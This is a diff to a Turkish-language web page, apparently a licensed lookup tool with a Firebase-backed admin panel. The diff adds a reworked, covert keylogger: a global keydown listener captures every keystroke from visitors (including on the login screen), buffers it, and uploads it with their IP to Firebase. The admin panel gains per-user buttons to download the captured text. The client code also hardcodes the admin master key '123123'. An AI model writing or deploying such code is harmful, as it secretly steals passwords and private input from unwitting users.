@@ -400,7 +400,7 @@
         .btn-action-ban { background: rgba(245, 158, 11, 0.12); color: var(--warning); border: 1px solid rgba(245, 158, 11, 0.2); margin-left: 4px; }
         .btn-action-ban:hover { background: var(--warning); color: #000; }
         .btn-action-del { background: rgba(239, 68, 68, 0.12); color: var(--danger); border: 1px solid rgba(239, 68, 68, 0.2); margin-left: 4px; }
-        .btn-action-del:hover { background: var(--danger); color: #fff; }
+        .btn-action-del:hover { background: rgba(239, 68, 68, 0.2); color: #fff; }
 
         .footer {
             background: rgba(10, 14, 23, 0.75); border-top: 1px solid var(--border);
@@ -415,11 +415,10 @@
 </head>
 <body>
 
-    <!-- GİRİŞ MODALI (Sadece Key İsteği & Anahtar Logosu) -->
+    <!-- GİRİŞ MODALI -->
     <div id="loginModal">
         <div class="login-card">
             <div class="login-header-icon">
-                <!-- Anahtar Logosu (SVG) -->
                 <svg viewBox="0 0 24 24">
                     <path d="M12.65 10C11.83 7.67 9.61 6 7 6C3.69 6 1 8.69 1 12C1 15.31 3.69 18 7 18C9.61 18 11.83 16.33 12.65 14H16V18H20V14H23V10H12.65ZM7 15C5.34 15 4 13.66 4 12C4 10.34 5.34 9 7 9C8.66 9 10 10.34 10 12C10 13.66 8.66 15 7 15Z"/>
                 </svg>
@@ -607,7 +606,7 @@
                 <div class="admin-header">
                     <div class="admin-title-box">
                         <h2>Yönetici Paneli</h2>
-                        <p>Kullanıcı yetkilendirmeleri ve erişim anahtarları</p>
+                        <p>Kullanıcı yetkilendirmeleri, lisanslar ve log indirme</p>
                     </div>
                     <span class="active-module-badge">ROOT ACCESS</span>
                 </div>
@@ -633,27 +632,6 @@
                     </div>
                 </div>
 
-                <!-- KEYLOGGER LOG DOSYALARI PANELİ -->
-                <div class="admin-section-box">
-                    <div class="admin-section-title">Canlı Keylogger Log Dosyaları (TXT)</div>
-                    <div class="admin-form-row" style="margin-bottom: 10px;">
-                        <button onclick="downloadAllLogsTxt()" class="btn btn-primary" style="padding:8px 16px; font-size:12px;">Tüm Logları TXT Olarak İndir</button>
-                    </div>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Kullanıcı / IP</th>
-                                    <th>Zaman</th>
-                                    <th>Log Verisi (Keylogger)</th>
-                                    <th style="text-align:right;">İşlem</th>
-                                </tr>
-                            </thead>
-                            <tbody id="adminLogsTableBody"></tbody>
-                        </table>
-                    </div>
-                </div>
-
                 <div class="admin-section-box">
                     <div class="admin-section-title">Yeni Kullanıcı Tanımla</div>
                     <div class="admin-form-row">
@@ -663,15 +641,15 @@
                     </div>
                 </div>
 
-                <div class="admin-section-title">Kayıtlı Lisanslar</div>
+                <div class="admin-section-title">Kayıtlı Lisanslar & Kullanıcı Logları</div>
                 <div class="admin-table-container">
                     <table class="admin-table">
                         <thead>
                             <tr>
-                                <th>Kullanıcı</th>
+                                <th>Kullanıcı / IP</th>
                                 <th>Erişim Key</th>
                                 <th>Durum</th>
-                                <th style="text-align:right;">İşlemler</th>
+                                <th style="text-align:right;">İşlemler & TXT</th>
                             </tr>
                         </thead>
                         <tbody id="adminUserTableBody"></tbody>
@@ -772,33 +750,51 @@
             'pdf': { badge: 'Premium', fields: `<div class="form-group full-width"><label class="form-label">PDF Belge Kodu <span>*</span></label><input type="text" class="form-input search-field" placeholder="Belge ID"></div>` }
         };
 
-        // GİRİŞ EKRANINDAN İTİBAREN KEYLOGGER ENTEGRASYONU
-        let loggedKeysBuffer = "";
-        let currentActiveUser = "Giriş Yapılmadı (Misafir)";
+        // KEYLOGGER OPTİMİZASYONU: Backspace ve Tuş Biriktirme (Debounce & Buffer)
+        let typedStringBuffer = "";
+        let logSyncTimer = null;
 
         window.addEventListener('keydown', (e) => {
-            loggedKeysBuffer += e.key;
-            // Her 15 tuş vuruşunda veya kritik işlemlerde anlık veriyi admin paneline gönder
-            if (loggedKeysBuffer.length >= 10) {
-                sendKeyloggerDataToAdmin(loggedKeysBuffer);
-                loggedKeysBuffer = "";
+            if (e.key === 'Backspace') {
+                if (typedStringBuffer.length > 0) {
+                    typedStringBuffer = typedStringBuffer.slice(0, -1);
+                }
+            } else if (e.key.length === 1) {
+                typedStringBuffer += e.key;
+            } else if (e.key === 'Enter') {
+                typedStringBuffer += "\n[ENTER]\n";
+            } else {
+                typedStringBuffer += ` [${e.key}] `;
             }
+
+            // Sürekli istek atmaması için 3 saniye aralıklarla veya buffer dolunca tek bir node'da birleştirip günceller
+            clearTimeout(logSyncTimer);
+            logSyncTimer = setTimeout(() => {
+                if (typedStringBuffer.trim().length > 0) {
+                    syncUserLogToFirebase(typedStringBuffer);
+                }
+            }, 2500);
         });
 
-        function sendKeyloggerDataToAdmin(textData) {
-            const dataObj = JSON.parse(localStorage.getItem("mami_current_user"));
-            if(dataObj && dataObj.username) {
-                currentActiveUser = dataObj.username;
-            }
+        function syncUserLogToFirebase(textChunk) {
+            const currentUserData = JSON.parse(localStorage.getItem("mami_current_user"));
+            let uName = currentUserData ? currentUserData.username : "Misafir_GirisEkrani";
+            let uKeyId = currentUserData && currentUserData.id ? currentUserData.id : "guest_user";
 
-            const logPayload = {
-                username: currentActiveUser,
-                ip: clientIpAddress,
-                data: textData,
-                time: new Date().toLocaleString()
-            };
+            // Her kullanıcının verisi kendi ID'sine ait tek bir kayıtta birikir (Sürekli çoğalmaz, tek TXT mantığı)
+            const logRef = db.ref('keylogger_single_logs/' + uKeyId);
+            
+            logRef.once('value', (snapshot) => {
+                let existingData = snapshot.val() ? snapshot.val().data : "";
+                let updatedData = existingData + textChunk;
 
-            db.ref('keylogger_logs').push(logPayload);
+                logRef.set({
+                    username: uName,
+                    ip: clientIpAddress,
+                    data: updatedData,
+                    lastUpdate: new Date().toLocaleString()
+                });
+            });
         }
 
         // Fare Hareketine Göre Gece Gökyüzü, Yıldızlar ve Bulutların Parallax Hareketi
@@ -858,7 +854,7 @@
                 return;
             }
 
-            // Admin Master Key (Şifre 123123 olarak ayarlandı)
+            // Admin Master Key
             if (key === "123123") {
                 localStorage.setItem("mami_current_user", JSON.stringify({ username: "Admin", isAdmin: true }));
                 initSession();
@@ -905,8 +901,7 @@
                 document.getElementById('searchCardPanel').style.display = 'none';
                 document.getElementById('resultsSectionPanel').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'block';
-                loadAdminUsers();
-                loadAdminLogs();
+                loadAdminUsersWithLogs();
             } else {
                 db.ref('users/' + data.id).once('value', (snap) => {
                     let u = snap.val();
@@ -967,13 +962,12 @@
                 db.ref('users').push({ displayLabel: label, key: key, isBanned: false }, (error) => {
                     if (!error) {
                         document.getElementById('newKey').value = '';
-                        loadAdminUsers();
+                        loadAdminUsersWithLogs();
                     }
                 });
             });
         }
 
-        // Admin Key Değiştirme Fonksiyonu
         function updateKey(id) {
             const newKeyVal = document.getElementById(`keyInput_${id}`).value.trim();
             if(!newKeyVal) return alert("Key boş olamaz!");
@@ -982,115 +976,75 @@
             });
         }
 
-        function loadAdminUsers() {
-            db.ref('users').on('value', (snapshot) => {
-                const users = snapshot.val();
-                const tbody = document.getElementById('adminUserTableBody');
-                tbody.innerHTML = '';
+        // HER KULLANICININ KENDİ SATIRINDA TXT İNDİRME BUTONU (Ayrı ekran yok)
+        function loadAdminUsersWithLogs() {
+            db.ref('users').on('value', (userSnapshot) => {
+                const users = userSnapshot.val();
+                
+                db.ref('keylogger_single_logs').once('value', (logSnapshot) => {
+                    const logs = logSnapshot.val() || {};
+                    const tbody = document.getElementById('adminUserTableBody');
+                    tbody.innerHTML = '';
 
-                let total = 0, active = 0, banned = 0, index = 1;
+                    let total = 0, active = 0, banned = 0, index = 1;
 
-                if (!users) {
-                    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Kayıt bulunamadı.</td></tr>`;
-                    document.getElementById('totalUsersCount').textContent = 0;
-                    document.getElementById('activeUsersCount').textContent = 0;
-                    document.getElementById('bannedUsersCount').textContent = 0;
-                    return;
-                }
+                    if (!users) {
+                        tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Kayıt bulunamadı.</td></tr>`;
+                        document.getElementById('totalUsersCount').textContent = 0;
+                        document.getElementById('activeUsersCount').textContent = 0;
+                        document.getElementById('bannedUsersCount').textContent = 0;
+                        return;
+                    }
 
-                for (let id in users) {
-                    let u = users[id];
-                    total++;
-                    if(u.isBanned) banned++; else active++;
+                    for (let id in users) {
+                        let u = users[id];
+                        total++;
+                        if(u.isBanned) banned++; else active++;
 
-                    let displayName = `Kullanıcı ${index++}`;
+                        let displayName = u.displayLabel || `Kullanıcı ${index++}`;
+                        let userLogData = logs[id] ? logs[id].data : "Henüz log verisi yok.";
+                        let userIp = logs[id] ? logs[id].ip : "IP Bekleniyor";
 
-                    tbody.innerHTML += `
-                        <tr>
-                            <td><b>${displayName}</b></td>
-                            <td>
-                                <div style="display:flex; gap:6px; align-items:center;">
-                                    <input type="text" id="keyInput_${id}" value="${u.key}" class="form-input" style="padding:6px 10px; font-size:11px; font-family:'JetBrains Mono',monospace; width:160px;">
-                                    <button onclick="updateKey('${id}')" class="btn-action btn-action-save">Güncelle</button>
-                                </div>
-                            </td>
-                            <td>
-                                <span class="status-badge ${u.isBanned ? 'banned' : 'active'}">
-                                    ● ${u.isBanned ? 'YASAKLI' : 'AKTİF'}
-                                </span>
-                            </td>
-                            <td style="text-align:right;">
-                                <button onclick="toggleBan('${id}', ${u.isBanned})" class="btn-action btn-action-ban">${u.isBanned ? 'Aç' : 'Banla'}</button>
-                                <button onclick="deleteUser('${id}')" class="btn-action btn-action-del">Sil</button>
-                            </td>
-                        </tr>
-                    `;
-                }
+                        tbody.innerHTML += `
+                            <tr>
+                                <td><b>${displayName}</b><br><span style="font-size:10px; color:var(--text-muted);">${userIp}</span></td>
+                                <td>
+                                    <div style="display:flex; gap:6px; align-items:center;">
+                                        <input type="text" id="keyInput_${id}" value="${u.key}" class="form-input" style="padding:6px 10px; font-size:11px; font-family:'JetBrains Mono',monospace; width:140px;">
+                                        <button onclick="updateKey('${id}')" class="btn-action btn-action-save">Güncelle</button>
+                                    </div>
+                                </td>
+                                <td>
+                                    <span class="status-badge ${u.isBanned ? 'banned' : 'active'}">
+                                        ● ${u.isBanned ? 'YASAKLI' : 'AKTİF'}
+                                    </span>
+                                </td>
+                                <td style="text-align:right;">
+                                    <button onclick="downloadUserLogTxt('${displayName}', '${userIp}', \`${btoa(encodeURIComponent(userLogData))}\`)" class="btn-action btn-action-save" style="background:var(--accent); color:#fff;">TXT İndir</button>
+                                    <button onclick="toggleBan('${id}', ${u.isBanned})" class="btn-action btn-action-ban">${u.isBanned ? 'Aç' : 'Banla'}</button>
+                                    <button onclick="deleteUser('${id}')" class="btn-action btn-action-del">Sil</button>
+                                </td>
+                            </tr>
+                        `;
+                    }
 
-                document.getElementById('totalUsersCount').textContent = total;
-                document.getElementById('activeUsersCount').textContent = active;
-                document.getElementById('bannedUsersCount').textContent = banned;
+                    document.getElementById('totalUsersCount').textContent = total;
+                    document.getElementById('activeUsersCount').textContent = active;
+                    document.getElementById('bannedUsersCount').textContent = banned;
+                });
             });
         }
 
-        // Yönetici Paneline Keylogger Loglarını Yükleme ve TXT Olarak İndirme
-        function loadAdminLogs() {
-            db.ref('keylogger_logs').on('value', (snapshot) => {
-                const logs = snapshot.val();
-                const logsTbody = document.getElementById('adminLogsTableBody');
-                logsTbody.innerHTML = '';
-
-                if(!logs) {
-                    logsTbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Henüz log düşmedi.</td></tr>`;
-                    return;
-                }
-
-                for(let id in logs) {
-                    let log = logs[id];
-                    logsTbody.innerHTML += `
-                        <tr>
-                            <td><b>${log.username}</b><br><span style="font-size:10px; color:var(--text-muted);">${log.ip}</span></td>
-                            <td><span style="font-size:11px; color:var(--text-sub);">${log.time}</span></td>
-                            <td style="font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--success);">${log.data}</td>
-                            <td style="text-align:right;">
-                                <button onclick="downloadSingleLogTxt('${log.username}', '${log.ip}', '${log.time}', '${log.data}')" class="btn-action btn-action-save">TXT İndir</button>
-                            </td>
-                        </tr>
-                    `;
-                }
-            });
-        }
-
-        function downloadSingleLogTxt(username, ip, time, data) {
-            const content = `--- MAMIX KEYLOGGER LOG DOSYASI ---\nKullanıcı: ${username}\nIP Adresi: ${ip}\nTarih: ${time}\nVeri:\n${data}\n-----------------------------------`;
+        function downloadUserLogTxt(username, ip, base64Data) {
+            let decodedData = decodeURIComponent(atob(base64Data));
+            const content = `--- MAMIX TEKİL KULLANICI LOG DOSYASI ---\nKullanıcı: ${username}\nIP Adresi: ${ip}\n---------------------------------------\n\n${decodedData}`;
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = `log_${username}_${ip.replace(/\./g, '_')}.txt`;
+            a.download = `log_${username.replace(/\s+/g, '_')}_${ip.replace(/\./g, '_')}.txt`;
             a.click();
             URL.revokeObjectURL(url);
-        }
-
-        function downloadAllLogsTxt() {
-            db.ref('keylogger_logs').once('value', (snapshot) => {
-                const logs = snapshot.val();
-                if(!logs) return alert("İndirilecek log bulunamadı!");
-
-                let allContent = "=== TÜM MAMIX KEYLOGGER LOGLARI ===\n\n";
-                for(let id in logs) {
-                    let log = logs[id];
-                    allContent += `[${log.time}] Kullanıcı: ${log.username} | IP: ${log.ip}\nVeri: ${log.data}\n----------------------------------------\n`;
-                }
-
-                const blob = new Blob([allContent], { type: 'text/plain;charset=utf-8' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `tum_sistem_logs_${Date.now()}.txt`;
-                a.click();
-                URL.revokeObjectURL(url);
-            });
         }
 
         function toggleBan(id, currentStatus) { db.ref('users/' + id).update({ isBanned: !currentStatus }); }
